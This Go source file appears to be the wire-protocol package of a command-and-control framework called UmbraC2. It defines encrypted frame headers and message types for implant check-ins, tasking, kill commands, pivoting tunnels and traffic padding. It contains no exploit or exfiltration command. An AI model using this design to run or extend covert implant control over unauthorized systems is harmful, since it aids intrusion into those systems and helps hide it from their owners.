// Package wire defines the UmbraC2 v1 frame format and message registry.
//
//	prelude (12 bytes, cleartext but authenticated as AEAD AAD)
//	  0..1  magic "UC"
//	  2     version
//	  3     flags (bit0 = bootstrap/PSK phase)
//	  4     message type
//	  5     AEAD suite
//	  6..7  reserved (must be zero)
//	  8..11 plaintext length (u32 BE)
//	  12..23 nonce (4-byte direction prefix + 8-byte counter, BE)
//	  24..   ciphertext || 16-byte tag
package wire

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io"
)

const (
	Version    byte = 1
	PreludeLen      = 12
	NonceLen        = 12
	TagLen          = 16
	HeaderLen       = PreludeLen + NonceLen
	MaxBody         = 1 << 20
	MaxFrame        = HeaderLen + MaxBody + TagLen
)

// Magic identifies an UmbraC2 frame on a shared socket.
var Magic = [2]byte{0x55, 0x43}

// AEAD suites. The server always supports suite 1; suite 2 is negotiated when
// every participant supports it (see crypt.SuiteSupported).
const (
	SuiteAES256GCM        byte = 1
	SuiteChaCha20Poly1305 byte = 2
)

// Frame flags.
const (
	FlagBootstrap byte = 0x01
)

// Message types -- stable wire constants, never renumber.
const (
	MsgHello    byte = 0x01
	MsgHelloAck byte = 0x02

	MsgCheckin    byte = 0x10
	MsgTaskBatch  byte = 0x11
	MsgResult     byte = 0x12
	MsgConfig     byte = 0x13
	MsgPing       byte = 0x14
	MsgPong       byte = 0x15
	MsgRekey      byte = 0x16
	MsgKill       byte = 0x17
	MsgTaskCancel byte = 0x18
	MsgBye        byte = 0x19

	// Pivoting tunnel frames. They ride the *same* session as the rest of
	// the protocol: an agent dials back to the team server after a `tunnel`
	// task, and the two ends multiplex logical streams over that callback
	// connection (see server/internal/pivot).
	MsgTunnelOpen  byte = 0x1A
	MsgTunnelData  byte = 0x1B
	MsgTunnelClose byte = 0x1C

	// MsgHeartbeat is the cheap signal of a beacon that is alive but
	// between two check-ins.
	//
	// A check-in is expensive: it may be minutes apart, and it carries
	// the whole inventory.  The heartbeat is the small frame a beacon
	// sends in between: the version of the implant, the module ABI it
	// speaks, how much work it is carrying and how long it has been up.
	// The server uses it to tell "the host is busy" from "the host is
	// gone", which is the difference between waiting and moving the work
	// somewhere else.
	MsgHeartbeat byte = 0x1D

	// Padding frames carry random bytes and are ignored by the receiver.
	// They let a transport pad its traffic to a fixed size bucket without
	// changing the frame format (see docs/PROTOCOL.md §7.3).
	MsgPadding byte = 0x1E

	MsgError byte = 0x1F

	MsgOpRequest  byte = 0x20
	MsgOpResponse byte = 0x21
	MsgOpEvent    byte = 0x22

	// payload markers inside handshake bodies
	MarkerHello    byte = 0x01
	MarkerHelloAck byte = 0x02
)

// HelloVersion is the newest handshake version this build speaks.
//
// The server accepts every version down to 1 and answers in the version
// the peer asked for, so an old beacon never sees a field it does not
// understand.  The matrix is in docs/PROTOCOL.md.
const HelloVersion byte = 2

// ABIVersion is the module ABI version this build speaks.
//
// The ABI is the contract between the host and the modules it loads: a
// module built for another ABI is refused by the host.
const ABIVersion byte = 1

// SuiteName returns the human readable name of an AEAD suite.
func SuiteName(id byte) string {
	switch id {
	case SuiteAES256GCM:
		return "aes-256-gcm"
	case SuiteChaCha20Poly1305:
		return "chacha20-poly1305"
	default:
		return fmt.Sprintf("unknown(%d)", id)
	}
}

// TypeName returns the human readable name of a message type.
func TypeName(t byte) string {
	switch t {
	case MsgHello:
		return "HELLO"
	case MsgHelloAck:
		return "HELLO_ACK"
	case MsgCheckin:
		return "CHECKIN"
	case MsgTaskBatch:
		return "TASK_BATCH"
	case MsgResult:
		return "RESULT"
	case MsgConfig:
		return "CONFIG"
	case MsgPing:
		return "PING"
	case MsgPong:
		return "PONG"
	case MsgRekey:
		return "REKEY"
	case MsgKill:
		return "KILL"
	case MsgTaskCancel:
		return "TASK_CANCEL"
	case MsgBye:
		return "BYE"
	case MsgHeartbeat:
		return "HEARTBEAT"
	case MsgTunnelOpen:
		return "TUNNEL_OPEN"
	case MsgTunnelData:
		return "TUNNEL_DATA"
	case MsgTunnelClose:
		return "TUNNEL_CLOSE"
	case MsgPadding:
		return "PADDING"
	case MsgError:
		return "ERROR"
	case MsgOpRequest:
		return "OP_REQUEST"
	case MsgOpResponse:
		return "OP_RESPONSE"
	case MsgOpEvent:
		return "OP_EVENT"
	default:
		return fmt.Sprintf("type(0x%02x)", t)
	}
}

var (
	ErrBadMagic   = errors.New("wire: bad magic")
	ErrBadVersion = errors.New("wire: unsupported version")
	ErrTooLarge   = errors.New("wire: frame too large")
	ErrReserved   = errors.New("wire: reserved prelude bytes set")
)

// Header is the parsed (still cleartext) part of a frame.
type Header struct {
	Version byte
	Flags   byte
	Type    byte
	Suite   byte
	Length  uint32
	Nonce   [NonceLen]byte
	Prelude [PreludeLen]byte
}

// BuildHeader assembles the authenticated prelude for a body of plaintextLen.
func BuildHeader(flags, msgType, suite byte, plaintextLen int) [PreludeLen]byte {
	var p [PreludeLen]byte
	p[0], p[1] = Magic[0], Magic[1]
	p[2] = Version
	p[3] = flags
	p[4] = msgType
	p[5] = suite
	p[6], p[7] = 0, 0
	binary.BigEndian.PutUint32(p[8:12], uint32(plaintextLen))
	return p
}

// ParsePrelude validates and decodes a prelude.
func ParsePrelude(p []byte) (Header, error) {
	var h Header
	if len(p) < PreludeLen {
		return h, io.ErrUnexpectedEOF
	}
	if p[0] != Magic[0] || p[1] != Magic[1] {
		return h, ErrBadMagic
	}
	if p[2] != Version {
		return h, fmt.Errorf("%w: %d", ErrBadVersion, p[2])
	}
	if p[6] != 0 || p[7] != 0 {
		return h, ErrReserved
	}
	if p[5] != SuiteAES256GCM && p[5] != SuiteChaCha20Poly1305 {
		return h, fmt.Errorf("wire: unknown suite %d", p[5])
	}
	h.Version = p[2]
	h.Flags = p[3]
	h.Type = p[4]
	h.Suite = p[5]
	h.Length = binary.BigEndian.Uint32(p[8:12])
	if h.Length > MaxBody {
		return h, ErrTooLarge
	}
	copy(h.Prelude[:], p[:PreludeLen])
	return h, nil
}

// FrameLen returns the total on-wire size of a frame with the given plaintext
// length, including header and tag.
func FrameLen(plaintextLen int) int { return HeaderLen + plaintextLen + TagLen }

// ReadFrame reads one complete frame (header + ciphertext + tag) from r.
func ReadFrame(r io.Reader) ([]byte, error) {
	prelude := make([]byte, PreludeLen)
	if _, err := io.ReadFull(r, prelude); err != nil {
		return nil, err
	}
	h, err := ParsePrelude(prelude)
	if err != nil {
		return nil, err
	}
	rest := make([]byte, NonceLen+int(h.Length)+TagLen)
	if _, err := io.ReadFull(r, rest); err != nil {
		return nil, err
	}
	return append(prelude, rest...), nil
}

// SplitFrames cuts a buffer holding one or more concatenated frames into
// individual frames. HTTP transports pack several frames into one request or
// response body, and a stream transport ends up here after a partial read.
// It refuses a trailing partial frame instead of silently dropping it.
func SplitFrames(buf []byte) ([][]byte, error) {
	var out [][]byte
	for pos := 0; pos < len(buf); {
		if pos+PreludeLen > len(buf) {
			return nil, fmt.Errorf("wire: truncated prelude at byte %d", pos)
		}
		h, err := ParsePrelude(buf[pos : pos+PreludeLen])
		if err != nil {
			return nil, fmt.Errorf("wire: frame at byte %d: %w", pos, err)
		}
		total := FrameLen(int(h.Length))
		if pos+total > len(buf) {
			return nil, fmt.Errorf("wire: truncated frame at byte %d", pos)
		}
		out = append(out, buf[pos:pos+total])
		pos += total
	}
	return out, nil
}

// MakeNonce builds a deterministic per-frame nonce.
func MakeNonce(prefix []byte, counter uint64) ([NonceLen]byte, error) {
	var n [NonceLen]byte
	if len(prefix) != 4 {
		return n, fmt.Errorf("wire: nonce prefix must be 4 bytes, got %d", len(prefix))
	}
	copy(n[:4], prefix)
	binary.BigEndian.PutUint64(n[4:], counter)
	return n, nil
}
